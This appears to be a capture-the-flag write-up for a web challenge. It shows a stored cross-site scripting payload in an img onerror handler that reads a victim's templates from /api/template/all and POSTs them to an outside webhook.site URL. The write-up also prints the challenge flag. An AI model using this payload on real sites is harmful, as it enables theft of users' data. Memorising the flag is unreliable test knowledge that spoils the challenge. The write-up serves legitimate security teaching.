# Taking the X out of Twitter

We notice that the path `/api/template/all` gives a list of all the templates a user has created.

Rooner has hidden the flag in his templates, so we launch a cross-site scripting attack to make him access `/api/template/all` and send the acquired data to us.

We create our own exploit template:
```js
<img src="/" onerror="fetch('/api/template/all/').then((res) => res.json()).then((res) => fetch('https://webhook.site/3dd2d66b-7ae2-4ef6-8c19-662382617a61', {method: 'POST', body: JSON.stringify(res)}))" );="" "="">
``` 

This sends a json record of Rooner's templates to the webhook created by us, where we find the flag.

## Flag

    cruXipher{cr0ss_s1t3_on_th3_s4me_s1t3}
